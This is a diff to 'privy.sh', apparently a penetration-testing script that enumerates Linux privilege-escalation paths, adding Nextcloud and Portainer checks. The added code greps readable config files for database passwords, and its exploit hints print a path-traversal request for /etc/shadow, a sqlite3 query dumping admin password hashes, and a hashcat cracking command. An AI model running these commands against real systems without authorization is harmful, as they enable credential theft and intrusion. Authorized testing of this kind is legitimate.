@@ -9,7 +9,7 @@
 # ============================================================================
 #  Linux Privilege Escalation Enumeration Tool
 #  Author : Pentest-Ready
-#  Version: 1.5
+#  Version: 1.6
 #  Usage  : chmod +x privy.sh && ./privy.sh
 # ============================================================================
 
@@ -61,7 +61,7 @@ banner() {
     echo "   ██║     ██║  ██║██║ ╚████╔╝    ██║"
     echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝"
     echo "  ============================================================================"
-    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.5${RST}"
+    echo -e "${YLW}   Linux Privilege Escalation Enumeration Tool v1.6${RST}"
     echo -e "${CYN}  ============================================================================${RST}"
     echo ""
 }
@@ -1079,8 +1079,11 @@ echo "" >> "$thirdparty"
 sub_header "Gitea (git server)" "$thirdparty"
 gitea_bin=$(find /opt/gitea /opt /usr/local/bin /srv -name 'gitea' -type f 2>/dev/null | head -1)
 gitea_ver=""
-if [ -n "$gitea_bin" ]; then
-    gitea_ver=$(_extract_ver "$("$gitea_bin" --version 2>/dev/null)")
+if [ -n "$gitea_bin" ] || pgrep -f 'gitea' >/dev/null 2>&1; then
+    [ -z "$gitea_bin" ] && gitea_bin="(process only)"
+    if [ "$gitea_bin" != "(process only)" ]; then
+        gitea_ver=$(_extract_ver "$("$gitea_bin" --version 2>/dev/null)")
+    fi
     echo "  [FOUND] Gitea: $gitea_bin  (v${gitea_ver:-unknown})" >> "$thirdparty"
     echo -e "    ${GRN}[✓] Gitea found (v${gitea_ver:-unknown})${RST}"
     if [ -n "$gitea_ver" ]; then
@@ -1132,8 +1135,11 @@ echo "" >> "$thirdparty"
 sub_header "Grafana (monitoring)" "$thirdparty"
 grafana_bin=$(which grafana-server 2>/dev/null || find /opt /usr/sbin /usr/share -name 'grafana-server' -type f 2>/dev/null | head -1)
 grafana_ver=""
-if [ -n "$grafana_bin" ]; then
-    grafana_ver=$(_extract_ver "$("$grafana_bin" --version 2>/dev/null)")
+if [ -n "$grafana_bin" ] || pgrep -f 'grafana' >/dev/null 2>&1; then
+    [ -z "$grafana_bin" ] && grafana_bin="(process only)"
+    if [ "$grafana_bin" != "(process only)" ]; then
+        grafana_ver=$(_extract_ver "$("$grafana_bin" --version 2>/dev/null)")
+    fi
     echo "  [FOUND] Grafana: $grafana_bin  (v${grafana_ver:-unknown})" >> "$thirdparty"
     echo -e "    ${GRN}[✓] Grafana found (v${grafana_ver:-unknown})${RST}"
     if [ -n "$grafana_ver" ]; then
@@ -1153,6 +1159,74 @@ if [ -n "$grafana_bin" ]; then
     done
 else
     echo "  Grafana: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Nextcloud ---
+sub_header "Nextcloud (file sharing)" "$thirdparty"
+nextcloud_dir=$(find /var/www /opt /srv -maxdepth 3 -name 'version.php' -path '*/nextcloud/*' 2>/dev/null | head -1 | xargs -I{} dirname {} 2>/dev/null)
+nextcloud_ver=""
+if [ -n "$nextcloud_dir" ] || pgrep -f 'nextcloud' >/dev/null 2>&1; then
+    [ -z "$nextcloud_dir" ] && nextcloud_dir="(process only)"
+    if [ "$nextcloud_dir" != "(process only)" ] && [ -r "$nextcloud_dir/version.php" ]; then
+        nextcloud_ver=$(_extract_ver "$(grep 'OC_Version\b\|OC_VersionString' "$nextcloud_dir/version.php" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')")
+    fi
+    echo "  [FOUND] Nextcloud: $nextcloud_dir  (v${nextcloud_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Nextcloud found (v${nextcloud_ver:-unknown})${RST}"
+    if [ -n "$nextcloud_ver" ]; then
+        # CVE-2023-48239: Nextcloud < 27.1.3 / 28.0.0-beta3 — improper auth bypass
+        if _ver_lt "$nextcloud_ver" "27.1.3"; then
+            finding "Nextcloud $nextcloud_ver — CVE-2023-48239: Auth bypass (< 27.1.3)" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}NEXTCLOUD_AUTH_BYPASS:${nextcloud_ver}:${nextcloud_dir}\n"
+        fi
+        # CVE-2024-37302: Nextcloud < 28.0.5 — SSRF via URL validation
+        if _ver_lt "$nextcloud_ver" "28.0.5"; then
+            finding "Nextcloud $nextcloud_ver — CVE-2024-37302: SSRF via URL validation (< 28.0.5)" "$thirdparty"
+        fi
+    fi
+    # Config file may contain DB credentials
+    for ncconf in "$nextcloud_dir/config/config.php" /var/www/nextcloud/config/config.php; do
+        if [ -r "$ncconf" ]; then
+            nc_creds=$(grep -E "dbpassword|dbuser|secret|password" "$ncconf" 2>/dev/null | grep -v '//')
+            if [ -n "$nc_creds" ]; then
+                finding "Nextcloud config.php readable and contains credentials: $ncconf" "$thirdparty"
+                echo "$nc_creds" | while read -r nl; do echo "       → $nl" >> "$thirdparty"; done
+            fi
+        fi
+    done
+else
+    echo "  Nextcloud: not found" >> "$thirdparty"
+fi
+echo "" >> "$thirdparty"
+
+# --- Portainer ---
+sub_header "Portainer (container management)" "$thirdparty"
+portainer_bin=$(find /opt /usr/local/bin -name 'portainer' -type f 2>/dev/null | head -1)
+portainer_ver=""
+if [ -n "$portainer_bin" ] || pgrep -f 'portainer' >/dev/null 2>&1; then
+    [ -z "$portainer_bin" ] && portainer_bin="(process only)"
+    if [ "$portainer_bin" != "(process only)" ]; then
+        portainer_ver=$(_extract_ver "$("$portainer_bin" --version 2>/dev/null)")
+    fi
+    echo "  [FOUND] Portainer: $portainer_bin  (v${portainer_ver:-unknown})" >> "$thirdparty"
+    echo -e "    ${GRN}[✓] Portainer found (v${portainer_ver:-unknown})${RST}"
+    if [ -n "$portainer_ver" ]; then
+        # CVE-2022-26960: Portainer < 2.11.1 — path traversal reading host files
+        if _ver_lt "$portainer_ver" "2.11.1"; then
+            finding "Portainer $portainer_ver — CVE-2022-26960: Path traversal, read host files (< 2.11.1)" "$thirdparty"
+            thirdparty_vulns="${thirdparty_vulns}PORTAINER_PATH_TRAV:${portainer_ver}:${portainer_bin}\n"
+        fi
+        # CVE-2024-21626 (runc) — check if running containers affected
+        finding "Portainer detected — verify runc version for CVE-2024-21626 (container breakout via /proc/self/fd, runc < 1.1.12)" "$thirdparty"
+    fi
+    # Check if Portainer data dir is readable (contains hashed admin password)
+    for pdata in /data /opt/portainer/data; do
+        if [ -r "$pdata/portainer.db" ]; then
+            finding "Portainer database readable: $pdata/portainer.db — may contain hashed admin credentials!" "$thirdparty"
+        fi
+    done
+else
+    echo "  Portainer: not found" >> "$thirdparty"
 fi
 echo "" >> "$thirdparty"
 
@@ -1202,7 +1276,7 @@ run_cmd "ls /srv" "ls -la /srv/ 2>/dev/null" "$thirdparty"
 for appdir in /opt/*/; do
     appname=$(basename "$appdir")
     case "$appname" in
-        gogs|gitea|jenkins|grafana|minio|flowise|lampp) continue ;;
+        gogs|gitea|jenkins|grafana|minio|flowise|nextcloud|portainer|lampp) continue ;;
     esac
     [ -d "$appdir" ] || continue
     echo "  [APP] $appdir — enumerate manually (version/CVEs unknown)" >> "$thirdparty"
@@ -1681,6 +1755,25 @@ if printf '%b' "$thirdparty_vulns" | grep -q "MINIO_INFO_LEAK"; then
 "  POST to health endpoint leaks MINIO_ROOT_USER and MINIO_ROOT_PASSWORD:
   \$ curl -s -X POST http://localhost:9000/minio/health/cluster?verify
   Use returned creds to access MinIO console or pivot to other services."
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "NEXTCLOUD_AUTH_BYPASS"; then
+    nc_v=$(printf '%b' "$thirdparty_vulns" | grep "NEXTCLOUD_AUTH_BYPASS" | cut -d: -f2 | head -1)
+    exploit_entry "P2" "Nextcloud $nc_v — CVE-2023-48239: Auth bypass" \
+"  Auth bypass in share link handling — check Nextcloud security advisories:
+  https://nextcloud.com/security/advisories/
+  Also enumerate: /nextcloud/config/config.php for DB credentials (may allow lateral move)
+  \$ curl -s http://target/nextcloud/status.php   # confirm version"
+fi
+
+if printf '%b' "$thirdparty_vulns" | grep -q "PORTAINER_PATH_TRAV"; then
+    pt_v=$(printf '%b' "$thirdparty_vulns" | grep "PORTAINER_PATH_TRAV" | cut -d: -f2 | head -1)
+    exploit_entry "P2" "Portainer $pt_v — CVE-2022-26960: Path traversal" \
+"  Read arbitrary host files via Portainer's file browser (authenticated):
+  GET /api/endpoints/1/docker/volumes/<vol>/browse?path=../../../../etc/shadow
+  Also check /data/portainer.db — contains bcrypt-hashed admin password:
+  \$ sqlite3 /data/portainer.db 'SELECT Username,Password FROM user;'
+  Crack: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"
 fi
 
 if printf '%b' "$thirdparty_vulns" | grep -q "FLOWISE_RCE"; then
